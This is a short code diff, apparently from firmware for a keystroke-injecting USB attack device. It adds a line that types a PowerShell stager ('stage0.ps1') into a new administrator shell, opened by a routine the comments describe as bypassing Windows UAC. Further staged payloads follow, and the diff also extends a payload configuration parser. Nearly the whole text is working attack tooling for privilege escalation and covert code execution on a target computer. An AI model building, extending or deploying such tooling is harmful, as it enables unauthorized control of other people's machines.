@@ -184,6 +184,7 @@ void setup() {
 	unpadmessage(adminstatus, (const char*) buf, 5);
 	if (strcmp(adminstatus, "False")){
 		UACBypass("psadmin.ps1"); //starts new PS shell as admin, and attempts to alt-y through UAC
+		typeFile("stage0.ps1"); //load the stager into the new window
 		functions->fire(); //add the HID functions to the new PS session
 		Payload* smallstage = new Payload("smallstager.ps1");
 		smallstage->fire();
@@ -218,6 +219,9 @@ void readconfig(){
 		}
 		Payload* load = new Payload(filename);
 		int offset = 0;
+		if (line[0] == ';'){ //allow for comments
+			goto skipline; //jump past the line parser
+		}
 		for (uint i=0; i<strlen(line); i++){
 			if(line[i]==','){
 				offset=(i+1);
@@ -277,6 +281,9 @@ void readconfig(){
 		}
 		payloadc++;
 		payloads[payloadc-1] = load; //put the new payload object into the array
+
+		skipline: //jump here to skip the parser
+		delay(0); //gcc *should* optimize this out
 
 	}
 	breakloop: //end of the loop
